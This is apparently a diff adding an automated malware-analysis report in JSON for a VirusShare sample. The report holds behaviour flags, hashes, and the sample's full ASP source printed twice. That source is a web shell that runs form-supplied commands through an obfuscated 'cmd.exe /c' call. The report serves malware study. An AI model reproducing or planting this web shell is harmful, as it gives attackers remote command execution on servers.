@@ -1,0 +1,69 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
+            "Call": "May call a DLL using Excel 4 Macros",
+            "CreateObject": "May create an OLE object",
+            "Run": "May run an executable file or a system command",
+            "Write": "May write to a file"
+        },
+        "macro": "<%@ Language=VBScript %>\n<%\n  Dim u\n  Dim v\n  Dim w, y\n  Dim z, k\n\n  On Error Resume Next\n\n  Set u = Server.CreateObject(\"\")\n  Set v = Server.CreateObject(\"\")\n  Set w = Server.CreateObject(\"Scripting.FileSystemObject\")\n\n  z = Request.Form(\".img\")\n  If (z <> \"\") Then\n\n    k = \"C:\\\" & w.GetTempName( )\n    Call u.Run (\"c\" & \"m\" & \"d\" & \".\" & \"e\" & \"x\" & \"e\" & \" /c \" & z & \" > \" & k, 0, True)\n    Set y = w.OpenTextFile (k, 1, False, 0)\n\n  End If\n\n%>\n<html>\n<body>\n<form action=\"<%= Request.ServerVariables(\"url\") %>\" method=\"post\">\n<input type=text name=\".img\" size=45 value=\"<%= z %>\">\n<input type=submit value=\"Run\">\n</form>\n<pre>\n<%= \"\\\\\" & v.ComputerName & \"\\\" & v.UserName %>\n<br>\n<%\n  If (IsObject(y)) Then\n    On Error Resume Next\n    Response.Write Server.HTMLEncode(y.ReadAll)\n    y.Close\n    Call w.DeleteFile(k, True)\n  End If\n%>\n</body>\n</html>"
+    },
+    "filename": "VirusShare_440564ef0ef77ac932a343b8f74bdad2",
+    "filesize": 856,
+    "filetype": "HTML document, ASCII text",
+    "hashes": {
+        "md5": "440564ef0ef77ac932a343b8f74bdad2",
+        "sha1": "b495452bab1136633b2fc9c6804a93d8557535bc",
+        "sha256": "0183971414b7601535038ac24072dddb45b0fb4060346672ae4e8228249dddee"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "<%@ Language=VBScript %>",
+            "  Dim u",
+            "  Dim v",
+            "  Dim w, y",
+            "  Dim z, k",
+            "  On Error Resume Next",
+            "  Set u = Server.CreateObject(\"\")",
+            "  Set v = Server.CreateObject(\"\")",
+            "  Set w = Server.CreateObject(\"Scripting.FileSystemObject\")",
+            "  z = Request.Form(\".img\")",
+            "  If (z <> \"\") Then",
+            "    k = \"C:\\\" & w.GetTempName( )",
+            "    Call u.Run (\"c\" & \"m\" & \"d\" & \".\" & \"e\" & \"x\" & \"e\" & \" /c \" & z & \" > \" & k, 0, True)",
+            "    Set y = w.OpenTextFile (k, 1, False, 0)",
+            "  End If",
+            "<html>",
+            "<body>",
+            "<form action=\"<%= Request.ServerVariables(\"url\") %>\" method=\"post\">",
+            "<input type=text name=\".img\" size=45 value=\"<%= z %>\">",
+            "<input type=submit value=\"Run\">",
+            "</form>",
+            "<pre>",
+            "<%= \"\\\\\" & v.ComputerName & \"\\\" & v.UserName %>",
+            "<br>",
+            "  If (IsObject(y)) Then",
+            "    On Error Resume Next",
+            "    Response.Write Server.HTMLEncode(y.ReadAll)",
+            "    y.Close",
+            "    Call w.DeleteFile(k, True)",
+            "  End If",
+            "</body>",
+            "</html>"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.271257",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
